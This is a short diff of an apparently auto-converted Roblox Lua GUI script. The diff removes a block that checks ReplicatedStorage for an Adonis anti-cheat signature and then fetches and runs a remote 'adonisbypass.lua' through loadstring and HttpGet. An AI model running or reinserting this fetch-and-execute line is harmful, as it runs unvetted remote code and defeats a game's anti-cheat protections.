@@ -9,14 +9,6 @@
 
 -- Instances: 170 | Scripts: 2 | Modules: 0 | Tags: 0
 
-task.spawn(function()
-	for _, rems in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
-		if rems:IsA("RemoteEvent") and rems:FindFirstChild("__FUNCTION") then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/refs/heads/main/adonisbypass.lua"))()
-		end
-	end
-end)
-
 local G2L = {};
 
 -- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
